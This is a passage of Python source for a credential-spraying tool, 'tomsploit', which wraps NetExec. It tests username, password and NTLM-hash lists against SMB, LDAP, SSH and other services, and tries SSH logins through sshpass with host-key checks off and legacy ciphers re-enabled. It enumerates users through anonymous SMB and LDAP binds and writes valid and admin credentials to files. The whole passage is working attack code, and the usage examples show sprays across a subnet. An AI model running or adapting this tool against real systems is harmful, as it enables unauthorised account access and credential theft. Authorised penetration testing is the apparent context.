def parse_protocol_list(spec: str | None) -> list[str]:
    if not spec:
        return list(ALL_PROTOCOLS)
    items = {s.strip().lower() for s in spec.split(",") if s.strip()}
    unknown = items - set(ALL_PROTOCOLS)
    if unknown:
        raise ValueError(
            f"Unknown protocol(s): {', '.join(sorted(unknown))}. "
            f"Valid: {', '.join(ALL_PROTOCOLS)}"
        )
    return [p for p in ALL_PROTOCOLS if p in items]


# ─── Port probe ────────────────────────────────────────────────────────

def tcp_probe(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=PORT_PROBE_TIMEOUT):
            return True
    except (OSError, socket.timeout):
        return False


def probe_protocols(host: str, protos: list[str]) -> list[str]:
    """Return protocols whose default port answers a TCP connect, in
    canonical order."""
    open_set: set[str] = set()
    with ThreadPoolExecutor(max_workers=10) as pool:
        futs = {pool.submit(tcp_probe, host, PROTOCOL_PORTS[p]): p for p in protos}
        for f in as_completed(futs):
            try:
                if f.result():
                    open_set.add(futs[f])
            except Exception:
                pass
    return [p for p in protos if p in open_set]


# ─── Credential file ───────────────────────────────────────────────────

CREDS_HEADER = (
    "# tomsploit valid credentials\n"
    "# target\tprotocol\tscope\tdomain\tuser\tauth_type\tsecret\tprivilege\ttimestamp\n"
)


def append_creds(path: str, result: TargetResult) -> None:
    if not result.successes:
        return
    is_new = not os.path.exists(path)
    now = datetime.now().isoformat(timespec="seconds")
    with open(path, "a") as f:
        if is_new:
            f.write(CREDS_HEADER)
        for s in result.successes:
            f.write("\t".join([
                result.real_ip or result.target,
                s.protocol, s.scope,
                s.domain or "-", s.user,
                s.auth_type.value, s.secret,
                "admin" if s.is_admin else "user",
                now,
            ]) + "\n")


# ─── Orchestrator ──────────────────────────────────────────────────────

class TomSploit:
    def __init__(self, cfg: Config, reporter: Reporter):
        self.cfg = cfg
        self.reporter = reporter

        self.creds = self._build_creds()
        if not self.creds:
            raise ValueError("No credentials to test (need -p, -H, or -k).")

        # Cancellation
        self._stop = threading.Event()
        self._procs_lock = threading.Lock()
        self._procs: set[subprocess.Popen] = set()

        # Progress
        self._progress_lock = threading.Lock()
        self._done = 0
        self._total = 0

        # Consolidated scan log (written once at the end). nxc is no longer
        # given --log: this nxc opens that path with mode "x" and crashes when
        # a second invocation reuses the name, so tomsploit captures every
        # command's output itself and writes a single log instead.
        self._log_lock = threading.Lock()
        self._log_buf: list[str] = []

    def _build_creds(self) -> list[Cred]:
        cfg = self.cfg
        if cfg.kerberos:
            return [Cred(u, "", AuthType.KERBEROS) for u in cfg.users]
        if cfg.paired:
            return self._build_paired_creds()
        pairs: list[Cred] = []
        pairs += [Cred(u, p, AuthType.PASSWORD)
                  for u in cfg.users for p in cfg.passwords]
        pairs += [Cred(u, h, AuthType.HASH)
                  for u in cfg.users for h in cfg.hashes]
        return pairs

    def _build_paired_creds(self) -> list[Cred]:
        """Positional pairing: user[i] is tried only against secret[i], not
        every secret. Used after a dump where you already know which secret
        belongs to which user (e.g. usernames.txt + hashes.txt line-for-line,
        or a single user:secret --combo file). Length agreement is enforced
        in build_config(). Empty secrets are skipped: a --combo line populates
        only one of hashes/passwords and leaves '' in the other, so a blank
        here means 'this line was the other type', not a real credential."""
        cfg = self.cfg
        pairs: list[Cred] = []
        if cfg.hashes:
            pairs += [Cred(u, h, AuthType.HASH)
                      for u, h in zip(cfg.users, cfg.hashes) if h]
        if cfg.passwords:
            pairs += [Cred(u, p, AuthType.PASSWORD)
                      for u, p in zip(cfg.users, cfg.passwords) if p]
        return pairs

    def cancel(self) -> None:
        self._stop.set()
        with self._procs_lock:
            for proc in list(self._procs):
                try:
                    proc.terminate()
                except OSError:
                    pass

    # ── progress bar ─
    # Progress is decorative and goes to stderr. It is suppressed when stderr
    # is not a TTY (piped/redirected) so logs don't fill with \r escape noise,
    # and when --quiet is set.
    def _progress_enabled(self) -> bool:
        return sys.stderr.isatty() and not self.cfg.quiet

    def _redraw(self) -> None:
        if self._total <= 0 or not self._progress_enabled():
            return
        done = min(self._done, self._total)   # never report >100%
        pct = int(100 * done / self._total)
        bar_len = 20
        filled = min(bar_len, int(bar_len * done / self._total))
        bar = "█" * filled + "░" * (bar_len - filled)
        line = f"  {DIM}{bar} {pct:3d}% ({done}/{self._total}){RESET} "
        self._last_progress_len = len(line)
        sys.stderr.write("\r" + line)
        sys.stderr.flush()

    def _tick(self, n: int = 1) -> None:
        with self._progress_lock:
            self._done += n
            self._redraw()

    def _clear_progress(self) -> None:
        if not self._progress_enabled():
            return
        width = max(getattr(self, "_last_progress_len", 0), 70)
        sys.stderr.write("\r" + " " * width + "\r")
        sys.stderr.flush()

    def _say(self, msg: str) -> None:
        with self._progress_lock:
            self._clear_progress()
            print(msg, flush=True)
            self._redraw()

    # ── subprocess wrapper ─
    def _run_proc(self, cmd: list[str], timeout: float) -> tuple[str, str, bool]:
        """Run nxc/ssh. Returns (stdout, stderr, timed_out). Every invocation's
        output is appended to the consolidated scan log."""
        if self._stop.is_set():
            raise InterruptedError()
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True)
        except FileNotFoundError as exc:
            err = f"executable not found: {exc.filename}"
            self._log(cmd, "", err, False)
            return "", err, False
        with self._procs_lock:
            self._procs.add(proc)
        try:
            try:
                out, err = proc.communicate(timeout=timeout)
                self._log(cmd, out or "", err or "", False)
                return out or "", err or "", False
            except subprocess.TimeoutExpired:
                proc.kill()
                try:
                    proc.communicate(timeout=2)
                except subprocess.TimeoutExpired:
                    pass
                self._log(cmd, "", "", True)
                return "", "", True
        finally:
            with self._procs_lock:
                self._procs.discard(proc)

    def _log(self, cmd: list[str], stdout: str, stderr: str,
             timed_out: bool) -> None:
        """Append one command and its output to the in-memory scan log."""
        rec = ["$ " + " ".join(shlex.quote(c) for c in cmd)]
        if timed_out:
            rec.append("  [timed out]")
        else:
            if stdout.strip():
                rec.append(stdout.rstrip())
            if stderr.strip():
                rec.append("[stderr] " + stderr.rstrip())
        with self._log_lock:
            self._log_buf.append("\n".join(rec))

    @staticmethod
    def _stderr_fallback(stdout: str, stderr: str) -> list[str]:
        """Stripped stderr lines, but only when stdout was empty (so we don't
        double-report). Used by every scan method."""
        if stdout or not stderr:
            return []
        return [ln.strip() for ln in stderr.split("\n") if ln.strip()]

    # ── one nxc invocation ─
    def _nxc_cmd(self, proto: str, target: str, cred: Cred,
                 local_auth: bool) -> list[str]:
        cmd = ["nxc", proto, target, "-u", cred.user]
        if cred.is_kerberos:
            cmd.append("--use-kcache")
        elif cred.is_hash:
            cmd.extend(["-H", cred.secret])
        else:
            cmd.extend(["-p", cred.secret])
        if local_auth:
            cmd.append("--local-auth")
        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
        return cmd

    # ── one (protocol, scope) task ─
    def _scan_protocol(self, proto: str, target: str, local_auth: bool
                       ) -> tuple[list[tuple[str, str]], list[Success], str]:
        """Run every credential against (proto, local_auth) for one target.
        Returns (status_lines, successes, target_info). Auth successes are
        de-duplicated here so repeated nxc [+] lines don't multiply."""
        lines: list[tuple[str, str]] = []
        successes: list[Success] = []
        seen_keys: set[tuple] = set()
        target_info = ""
        consecutive_timeouts = 0
        scope_label = "local" if local_auth else "domain"

        # SSH is handled with the REAL ssh client, not nxc's SSH module —
        # nxc's paramiko-based handler can disagree with OpenSSH on servers
        # with non-standard auth, so we test what an actual login would do.
        if proto == "ssh":
            return self._scan_ssh(target)

        for idx, cred in enumerate(self.creds):
            if self._stop.is_set():
                break

            # Skip auth methods this protocol can't use (e.g. hash vs ssh).
            if (cred.is_hash or cred.is_kerberos) and proto not in WINDOWS_PROTOS:
                self._tick(); continue

            cmd = self._nxc_cmd(proto, target, cred, local_auth)
            try:
                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
            except InterruptedError:
                break

            if timed_out:
                consecutive_timeouts += 1
                self._tick()
                if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                    lines.append(("[!]",
                                  f"{MAX_CONSECUTIVE_TIMEOUTS} consecutive "
                                  f"timeouts — skipped"))
                    self._say(f"  {YELLOW}⏱ {proto.upper()} ({scope_label}){RESET} "
                              f"{DIM}consecutive timeouts — skipping{RESET}")
                    # Tick the remaining attempts so the bar stays honest.
                    self._tick(len(self.creds) - (idx + 1))
                    break
                continue
            consecutive_timeouts = 0

            for raw in stdout.split("\n"):
                marker, msg = parse_nxc_line(raw.strip())
                if marker == "[*]":
                    if not target_info:
                        target_info = msg
                elif marker == "[+]":
                    if not is_auth_success(msg, cred.user):
                        # A [+] that isn't a clean auth success. Usually it's
                        # benign module output ("Dumped 5 objects"), but it
                        # could be a real success in a shape we don't parse
                        # (nxc format drift, an unusual protocol response).
                        # If it looks credential-ish, flag it for manual
                        # review with [?] instead of silently treating it as
                        # noise; otherwise show it plainly.
                        if looks_like_possible_success(msg, cred.user):
                            lines.append(("[?]", msg))
                            self._say(f"  {YELLOW}{BOLD}? {proto.upper()} "
                                      f"({scope_label}){RESET} {YELLOW}{msg}"
                                      f"{RESET} {DIM}← verify manually{RESET}")
                        else:
                            lines.append((marker, msg))
                        continue
                    domain, user, secret, is_admin, is_guest = \
                        parse_success_message(msg)
                    if not secret:
                        secret = cred.secret
                        user = user or cred.user
                    success = Success(
                        protocol=proto, local_auth=local_auth,
                        domain=domain, user=user, secret=secret,
                        auth_type=cred.auth_type,
                        is_admin=is_admin, is_guest=is_guest,
                        raw_message=msg,
                    )
                    if success.dedup_key in seen_keys:
                        continue
                    seen_keys.add(success.dedup_key)
                    lines.append((marker, msg))
                    successes.append(success)
                    color = YELLOW if is_guest else GREEN
                    tag = " [Guest]" if is_guest else ""
                    self._say(f"  {color}{BOLD}⚡ {proto.upper()} "
                              f"({scope_label}){RESET} {color}{msg}{tag}{RESET}")
                elif marker in ("[-]", "[!]"):
                    lines.append((marker, msg))

            for raw in self._stderr_fallback(stdout, stderr):
                lines.append(("[-]", raw))

            self._tick()
        return lines, successes, target_info

    # ── SSH via the real ssh client (not nxc's module) ─
    _SSH_MARKER = "TOMSPLOIT_SSH_OK"

    def _scan_ssh(self, target: str
                  ) -> tuple[list[tuple[str, str]], list[Success], str]:
        """Attempt SSH logins with the actual OpenSSH client (sshpass for
        passwords), so results match what a real `ssh user@host` does rather
        than nxc's paramiko handler. Same return shape as _scan_protocol.

        A login counts as success only if ssh exits 0 AND our marker comes
        back on stdout — proving a real shell executed a command, not just a
        banner/keyboard-interactive prompt. Connection failures (refused,
        unreachable, host-key) are reported separately from auth failures so
        a dead host is never shown as 'wrong password'."""
        lines: list[tuple[str, str]] = []
        successes: list[Success] = []
        seen_keys: set[tuple] = set()
        target_info = ""

        if not shutil.which("ssh"):
            lines.append(("[!]", "ssh client not found — cannot test SSH"))
            self._say(f"  {YELLOW}⚠ SSH{RESET} {DIM}ssh client not on PATH — "
                      f"skipping SSH{RESET}")
            self._tick(len(self.creds))
            return lines, successes, target_info

        have_sshpass = shutil.which("sshpass") is not None
        warned_no_sshpass = False
        legacy_mode = False   # flipped (once) when an old server rejects modern algos

        for cred in self.creds:
            if self._stop.is_set():
                break

            # Real-ssh path tests passwords (nxc's SSH module did the same).
            # Hash/kerberos creds aren't SSH-applicable — skip and tick.
            if cred.is_hash or cred.is_kerberos:
                self._tick(); continue

            if not have_sshpass:
                if not warned_no_sshpass:
                    lines.append(("[!]", "sshpass not found — install it "
                                  "(apt install sshpass) to test SSH passwords"))
                    self._say(f"  {YELLOW}⚠ SSH{RESET} {DIM}sshpass not "
                              f"installed — skipping SSH password tests "
                              f"(apt install sshpass){RESET}")
                    warned_no_sshpass = True
                self._tick(); continue

            cmd = self._ssh_cmd(target, cred.user, cred.secret, legacy=legacy_mode)
            try:
                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
            except InterruptedError:
                break

            label = f"{cred.user}:{cred.secret}"
            if timed_out:
                lines.append(("[-]", f"{label} — connection timed out"))
                self._tick(); continue

            combined = f"{stdout}\n{stderr}"

            # Old SSH server? The first time negotiation fails, switch this
            # target to legacy algorithms and retry the same cred — otherwise a
            # reachable but ancient box gets ZERO passwords tested. The flag
            # sticks so the rest of the creds reuse legacy mode automatically.
            if (not legacy_mode and self._SSH_MARKER not in stdout
                    and self._ssh_is_negotiation_error(combined)):
                legacy_mode = True
                self._say(f"  {YELLOW}↻ SSH{RESET} {DIM}algorithm negotiation "
                          f"failed — retrying with legacy algorithms{RESET}")
                try:
                    stdout, stderr, timed_out = self._run_proc(
                        self._ssh_cmd(target, cred.user, cred.secret, legacy=True),
                        SUBPROCESS_TIMEOUT)
                except InterruptedError:
                    break
                if timed_out:
                    lines.append(("[-]", f"{label} — connection timed out"))
                    self._tick(); continue
                combined = f"{stdout}\n{stderr}"

            if self._SSH_MARKER in stdout:
                # Genuine shell access.
                success = Success(
                    protocol="ssh", local_auth=False,
                    domain="", user=cred.user, secret=cred.secret,
                    auth_type=cred.auth_type, is_admin=False, is_guest=False,
                    raw_message=f"{cred.user}:{cred.secret} (ssh login OK)",
                )
                if success.dedup_key not in seen_keys:
                    seen_keys.add(success.dedup_key)
                    lines.append(("[+]", success.raw_message))
                    successes.append(success)
                    self._say(f"  {GREEN}{BOLD}⚡ SSH{RESET} "
                              f"{GREEN}{cred.user}:{cred.secret} "
                              f"(real ssh login){RESET}")
            elif self._ssh_is_conn_error(combined):
                # Not an auth result — host/network problem; report once-ish.
                reason = self._ssh_conn_reason(combined)
                lines.append(("[-]", f"{label} — {reason}"))
            else:
                # Reached the service, auth was rejected.
                lines.append(("[-]", f"{label} — auth failed"))

            self._tick()
        return lines, successes, target_info

    # Legacy algorithm options, appended on a negotiation-failure retry so an
    # old SSH server (only offering ssh-rsa host keys / SHA-1 KEX / CBC ciphers,
    # which modern OpenSSH disables by default) still gets its passwords tested
    # instead of being written off as "negotiation failed".
    _SSH_LEGACY_OPTS = [
        "-o", "HostKeyAlgorithms=+ssh-rsa,ssh-dss",
        "-o", ("KexAlgorithms=+diffie-hellman-group1-sha1,"
               "diffie-hellman-group14-sha1,"
               "diffie-hellman-group-exchange-sha1"),
        "-o", "Ciphers=+aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc",
        "-o", "MACs=+hmac-sha1,hmac-md5",
    ]

    @staticmethod
    def _ssh_cmd(target: str, user: str, secret: str,
                 legacy: bool = False) -> list[str]:
        """sshpass + ssh, password auth only, non-interactive, runs a marker
        command so success means a real shell executed it. legacy=True re-enables
        the old host-key/KEX/cipher algorithms for ancient servers."""
        marker = TomSploit._SSH_MARKER
        ssh = [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "GlobalKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10",
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            "-o", "NumberOfPasswordPrompts=1",
            "-o", "LogLevel=ERROR",
        ]
        if legacy:
            ssh.extend(TomSploit._SSH_LEGACY_OPTS)
        ssh.extend([
            f"{user}@{target}",
            f"echo {marker}; id 2>/dev/null",
        ])
        return ["sshpass", "-p", secret, *ssh]

    @staticmethod
    def _ssh_is_conn_error(text: str) -> bool:
        t = text.lower()
        needles = (
            "connection refused", "connection timed out", "no route to host",
            "network is unreachable", "could not resolve", "name or service",
            "connection closed by", "connection reset", "kex_exchange",
            "no matching", "host key verification failed", "broken pipe",
            "port 22: ", "unable to negotiate",
        )
        return any(n in t for n in needles)

    @staticmethod
    def _ssh_is_negotiation_error(text: str) -> bool:
        """The retriable subset of connection errors: host-key / KEX / cipher
        mismatch. Refused / unreachable / unresolved are NOT retriable."""
        t = text.lower()
        return any(n in t for n in
                   ("no matching", "unable to negotiate", "kex_exchange"))

    @staticmethod
    def _ssh_conn_reason(text: str) -> str:
        t = text.lower()
        if "connection refused" in t:        return "connection refused (port closed?)"
        if "no route to host" in t:          return "no route to host"
        if "network is unreachable" in t:    return "network unreachable"
        if ("could not resolve" in t or "name or service" in t):
            return "could not resolve hostname"
        if "host key verification" in t:     return "host key verification failed"
        if ("no matching" in t or "unable to negotiate" in t
                or "kex_exchange" in t):     return "ssh algorithm negotiation failed"
        if "connection timed out" in t:      return "connection timed out"
        return "connection error"

    # ── anonymous SMB probe ─
    def _lockout_precheck(self, result: TargetResult) -> None:
        """Read the password policy over an ANONYMOUS SMB session
        (nxc --pass-pol) BEFORE spraying, so we can warn about account
        lockout. Best-effort: many DCs deny this without a credential, in
        which case the threshold stays unknown. Never blocks the spray."""
        if self.cfg.kerberos:
            return
        target = result.target
        cmd = ["nxc", "smb", target, "-u", "", "-p", "", "--pass-pol",
               "--timeout", str(NETEXEC_TIMEOUT)]
        try:
            stdout, _stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return
        result.lockout_checked = True
        if timed_out:
            return
        m = re.search(r"Account Lockout Threshold:\s*(\d+|None)", stdout,
                      re.IGNORECASE)
        if m:
            val = m.group(1).lower()
            result.lockout_threshold = 0 if val == "none" else int(val)
        mw = re.search(r"Reset Account Lockout Counter:\s*([^\r\n]+)", stdout,
                       re.IGNORECASE)
        if mw:
            result.lockout_window = mw.group(1).strip()

    def _scan_anon_smb(self, target: str) -> tuple[list[str], bool]:
        cmd = ["nxc", "smb", target, "-u", "", "-p", "",
               "--timeout", str(NETEXEC_TIMEOUT)]
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return [], False
        if timed_out:
            return ["[!] Anonymous SMB check timed out"], False
        out_lines: list[str] = []
        success = False
        for raw in stdout.split("\n"):
            line = raw.strip()
            if not line:
                continue
            out_lines.append(line)
            marker, msg = parse_nxc_line(line)
            if marker == "[+]":
                if not success:
                    self._say(f"  {YELLOW}{BOLD}⚡ SMB (anon){RESET} "
                              f"{YELLOW}{msg}{RESET}")
                success = True
        out_lines.extend(self._stderr_fallback(stdout, stderr))
        return out_lines, success

    # ── anonymous LDAP probe ─
    def _scan_anon_ldap(self, target: str) -> tuple[list[str], bool, list[dict]]:
        """Anonymous LDAP query to enumerate users and descriptions.
        Returns (raw_lines, success, users_list)."""
        cmd = ["nxc", "ldap", target, "-u", "", "-p", "",
               "--query", "(objectClass=*)", "",
               "--timeout", str(NETEXEC_TIMEOUT)]
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT * 2)
        except InterruptedError:
            return [], False, []
        if timed_out:
            return ["[!] Anonymous LDAP check timed out"], False, []

        out_lines: list[str] = []
        success = False
        users: list[dict] = []
        current_user: dict = {}

        for raw in stdout.split("\n"):
            line = raw.strip()
            if not line:
                continue
            out_lines.append(line)
            marker, _ = parse_nxc_line(line)
            # The (objectClass=*) query prints many [+] lines; only announce
            # the successful bind once (this was a source of duplicate output).
            if marker == "[+]":
                if not success:
                    self._say(f"  {YELLOW}{BOLD}⚡ LDAP (anon){RESET} "
                              f"{YELLOW}anonymous bind successful{RESET}")
                success = True

            lower = line.lower()
            if "samaccountname:" in lower:
                if current_user.get("user"):
                    users.append(current_user)
                sam = line.split(":", 1)[1].strip() if ":" in line else ""
                # Skip computer accounts (trailing $).
                current_user = ({"user": sam, "description": ""}
                                if sam and not sam.endswith("$") else {})
            elif "description:" in lower and current_user.get("user"):
                current_user["description"] = (
                    line.split(":", 1)[1].strip() if ":" in line else "")

        if current_user.get("user"):
            users.append(current_user)

        out_lines.extend(self._stderr_fallback(stdout, stderr))
        if success and users:
            self._say(f"  {YELLOW}{BOLD}⚡ LDAP (anon){RESET} {YELLOW}"
                      f"found {len(users)} user(s) via anonymous bind{RESET}")
        return out_lines, success, users

    # ── probe + scan phases for one target ─
    def _probe(self, target: str) -> tuple[list[str], list[str]]:
        if self.cfg.no_port_probe:
            open_protos = list(self.cfg.protocols)
        else:
            open_protos = probe_protocols(target, self.cfg.protocols)
        closed = [p for p in self.cfg.protocols if p not in open_protos]
        return open_protos, closed

    def _scan_target(self, result: TargetResult) -> None:
        """Run all protocol + anonymous scans for an already-probed target,
        filling `result` in place."""
        open_protos = result.open_protocols

        tasks: list[tuple[str, bool]] = []
        for proto in open_protos:
            tasks.append((proto, False))
            if proto in LOCAL_AUTH_PROTOCOLS and not self.cfg.kerberos:
                tasks.append((proto, True))

        with self._progress_lock:
            self._done = 0
            self._total = len(tasks) * len(self.creds)
            self._redraw()

        start = time.time()
        anon_lines: list[str] = []
        anon_success = False
        target = result.target
        seen_target_keys: set[tuple] = set()

        with ThreadPoolExecutor(max_workers=max(2, self.cfg.workers)) as pool:
            anon_future = (pool.submit(self._scan_anon_smb, target)
                           if "smb" in open_protos and not self.cfg.kerberos
                           else None)
            anon_ldap_future = (pool.submit(self._scan_anon_ldap, target)
                                if "ldap" in open_protos and not self.cfg.kerberos
                                else None)

            future_to_task = {
                pool.submit(self._scan_protocol, proto, target, scope): (proto, scope)
                for proto, scope in tasks
            }
            for fut in as_completed(future_to_task):
                if self._stop.is_set():
                    break
                proto, scope = future_to_task[fut]
                key = f"{proto}-{'local' if scope else 'domain'}"
                try:
                    lines, successes, tinfo = fut.result()
                except Exception as exc:
                    lines, successes, tinfo = [("[!]", f"Task error: {exc}")], [], ""
                    if self.cfg.debug:
                        import traceback; traceback.print_exc()
                result.protocol_lines[key] = lines
                if tinfo and not result.target_info:
                    result.target_info = tinfo
                # Dedup once more at the target level (belt and suspenders).
                for s in successes:
                    if s.dedup_key in seen_target_keys:
                        continue
                    seen_target_keys.add(s.dedup_key)
                    (result.guests if s.is_guest else result.successes).append(s)

            if anon_future is not None:
                try:
                    anon_lines, anon_success = anon_future.result()
                except Exception as exc:
                    anon_lines = [f"[!] Anonymous SMB error: {exc}"]

            if anon_ldap_future is not None:
                try:
                    ldap_lines, ldap_ok, ldap_users = anon_ldap_future.result()
                except Exception as exc:
                    ldap_lines, ldap_ok, ldap_users = \
                        [f"[!] Anonymous LDAP error: {exc}"], False, []
                result.anon_ldap_lines = ldap_lines
                result.anon_ldap = ldap_ok
                result.anon_ldap_users = ldap_users

        result.anon_smb_lines = anon_lines
        result.anon_smb = anon_success

        # Derive hostname / domain / DC / real IP from the gathered output.
        result.hostname = extract_hostname(result.target_info)
        result.domain = extract_domain(result.target_info)

        # DC detection signals (see detect_dc):
        #  - LDAP port open (member servers don't answer LDAP)
        #  - an LDAP [*] info line came back (LDAP actually responded)
        #  - any nxc line explicitly naming the DC role
        ldap_open = "ldap" in result.open_protocols
        ldap_info = ""
        role_flag = False
        for key, plines in result.protocol_lines.items():
            for marker, msg in plines:
                if line_flags_dc_role(msg):
                    role_flag = True
                if key.startswith("ldap-") and marker == "[*]" and not ldap_info:
                    ldap_info = msg
        # anonymous LDAP probe answering is itself evidence LDAP is live
        if result.anon_ldap or result.anon_ldap_lines:
            ldap_open = True
        result.is_dc = detect_dc(result.target_info, ldap_open,
                                 ldap_info, role_flag)

        # SMB signing — only the SMB [*] info line carries it. Check the SMB
        # protocol lines and the anonymous-SMB probe output.
        for key, plines in result.protocol_lines.items():
            if not key.startswith("smb-"):
                continue
            for marker, msg in plines:
                sig = extract_smb_signing(msg)
                if sig is not None:
                    result.smb_signing = sig
                    break
            if result.smb_signing is not None:
                break
        if result.smb_signing is None:
            for line in result.anon_smb_lines:
                sig = extract_smb_signing(line)
                if sig is not None:
                    result.smb_signing = sig
                    break

        for _, plines in result.protocol_lines.items():
            for _, msg in plines:
                ip = extract_ipv4(msg)
                if ip:
                    result.real_ip = ip; break
            if result.real_ip:
                break
        if not result.real_ip:
            for line in anon_lines:
                ip = extract_ipv4(line)
                if ip:
                    result.real_ip = ip; break
        result.real_ip = result.real_ip or target

        result.elapsed = time.time() - start
        self._clear_progress()

    # ── full scan ─
    def run(self) -> int:
        self.reporter.banner()
        results: list[TargetResult] = []
        try:
            for target in self.cfg.targets:
                if self._stop.is_set():
                    break
                try:
                    self.reporter.target_header(target)
                    open_protos, closed = self._probe(target)
                    result = TargetResult(target=target,
                                          open_protocols=open_protos,
                                          closed_protocols=closed)
                    if not open_protos:
                        result.scanned = False
                        result.skipped_reason = "no open ports"
                        self.reporter.no_open_ports()
                        results.append(result)
                        continue

                    self.reporter.port_probe(result)
                    if "smb" in result.open_protocols:
                        self._lockout_precheck(result)
                    self.reporter.lockout_warning(result)
                    self._scan_target(result)
                    self.reporter.protocol_results(result)
                    self.reporter.valid_section(result)

                    if self.cfg.creds_file and result.successes:
                        try:
                            append_creds(self.cfg.creds_file, result)
                        except OSError as exc:
                            print(f"  {YELLOW}[!] Could not write creds file: "
                                  f"{exc}{RESET}")
                    results.append(result)
                except KeyboardInterrupt:
                    raise
                except Exception as exc:
                    self._clear_progress()
                    print(f"\n  {RED}{BOLD}✗ Error on {target}:{RESET} "
                          f"{exc.__class__.__name__}: {exc}")
                    if self.cfg.debug:
                        import traceback; traceback.print_exc()
                    else:
                        print(f"  {DIM}Re-run with --debug for traceback.{RESET}")
                    failed = TargetResult(target=target, scanned=False,
                                          skipped_reason=f"error: {exc.__class__.__name__}")
                    results.append(failed)
        finally:
            if not self._stop.is_set():
                self.reporter.summary(results)
            if self.cfg.json_out:
                self._write_json(results)
            self._write_log(results)
            if not self._stop.is_set():
                self.reporter.next_steps(results)
        return 130 if self._stop.is_set() else 0

    def _write_json(self, results: list[TargetResult]) -> None:
        def ser_succ(s: Success) -> dict:
            return {
                "protocol": s.protocol, "scope": s.scope,
                "domain": s.domain, "user": s.user, "secret": s.secret,
                "auth_type": s.auth_type.value,
                "is_admin": s.is_admin, "is_guest": s.is_guest,
                "raw_message": s.raw_message,
            }
        payload = {
            "scan_time": datetime.now().isoformat(timespec="seconds"),
            "log_file": self.cfg.log_file,
            "creds_file": self.cfg.creds_file,
            "kerberos": self.cfg.kerberos,
            "protocols": self.cfg.protocols,
            "targets": [
                {
                    "target": r.target, "real_ip": r.real_ip,
                    "hostname": r.hostname, "domain": r.domain,
                    "is_dc": r.is_dc, "scanned": r.scanned,
                    "smb_signing": r.smb_signing,
                    "skipped_reason": r.skipped_reason or None,
                    "elapsed_seconds": round(r.elapsed, 2),
                    "open_protocols": r.open_protocols,
                    "closed_protocols": r.closed_protocols,
                    "anon_smb": r.anon_smb, "anon_ldap": r.anon_ldap,
                    "anon_ldap_users": r.anon_ldap_users,
                    "successes": [ser_succ(s) for s in r.successes],
                    "guests": [ser_succ(s) for s in r.guests],
                }
                for r in results
            ],
        }
        try:
            with open(self.cfg.json_out, "w") as f:
                json.dump(payload, f, indent=2)
        except OSError as exc:
            print(f"  {YELLOW}[!] Could not write JSON: {exc}{RESET}")

    def _write_log(self, results: list[TargetResult]) -> None:
        """Write the consolidated scan log (replaces nxc's per-call --log):
        the raw output of every command, then a short per-target summary.
        Only writes when -o/--output gave a path; otherwise nothing is left
        on disk (nxc still keeps its own logs under ~/.nxc/logs)."""
        if not self.cfg.log_file:
            return
        try:
            with open(self.cfg.log_file, "w") as f:
                f.write(f"tomsploit — "
                        f"{datetime.now().isoformat(timespec='seconds')}\n")
                f.write(f"targets:   {', '.join(self.cfg.targets)}\n")
                f.write(f"protocols: {', '.join(self.cfg.protocols)}\n")
                with self._log_lock:
                    body = list(self._log_buf)
                f.write(f"\n{'=' * 60}\n  RAW COMMAND OUTPUT\n{'=' * 60}\n")
                f.write("\n\n".join(body) if body else "(no commands run)")
                f.write(f"\n\n{'=' * 60}\n  RESULT SUMMARY\n{'=' * 60}\n")
                for r in results:
                    head = r.target
                    if r.hostname or r.domain:
                        head += (f"  (host:{r.hostname or '?'} "
                                 f"domain:{r.domain or '?'})")
                    f.write(f"\n{head}\n")
                    if not r.scanned:
                        f.write(f"  skipped: {r.skipped_reason}\n")
                        continue
                    if r.successes:
                        for s in r.successes:
                            adm = " (admin)" if s.is_admin else ""
                            f.write(f"  [+] {s.protocol} {s.scope}  "
                                    f"{s.user}:{s.secret}{adm}\n")
                    else:
                        f.write("  no valid credentials\n")
        except OSError as exc:
            print(f"  {YELLOW}[!] Could not write log file: {exc}{RESET}")


# ─── CLI ───────────────────────────────────────────────────────────────

class _BlankCollapser:
    """Wraps a stream and collapses any run of 2+ consecutive blank lines
    into a single blank line. The report is assembled from many independent
    section methods, several of which both end with a trailing blank and
    begin with a leading blank; rather than couple those methods together,
    we normalise vertical whitespace at one choke point. Only touches
    newline bookkeeping — every other character passes through untouched.
    Progress output goes to stderr, so it is unaffected."""

    def __init__(self, stream):
        self._s = stream
        self._pending_blanks = 0
        self._at_line_start = True

    def write(self, text: str) -> int:
        if not text:
            return 0
        for line in text.splitlines(keepends=True):
            has_nl = line.endswith("\n")
            content = line[:-1] if has_nl else line
            is_blank = self._at_line_start and content.strip() == ""
            if has_nl and is_blank:
                # Defer blank lines; emit at most one before real content.
                self._pending_blanks += 1
                self._at_line_start = True
            else:
                if self._pending_blanks:
                    self._s.write("\n")
                    self._pending_blanks = 0
                self._s.write(line)
                self._at_line_start = has_nl
        return len(text)

    def flush(self) -> None:
        self._s.flush()

    def __getattr__(self, name):
        return getattr(self._s, name)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="tomsploit",
        description="Fast NetExec (nxc) triage: spray a credential set across "
                    "protocols, confirm what's valid, and print the exact "
                    "follow-up commands for each win. Enumeration only — it "
                    "finds and reports access, it does not exploit, dump, or "
                    "loot (it hands you the commands to do that yourself).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  tomsploit -t 192.168.1.10 -u admin -p 'Password123'
  tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt
  tomsploit -t target.htb -u admin -H aad3b...:31d6cfe0...
  tomsploit -t 192.168.1.10 -u users.txt -H hashes.txt --paired
  tomsploit -t 192.168.1.10 --combo creds.txt
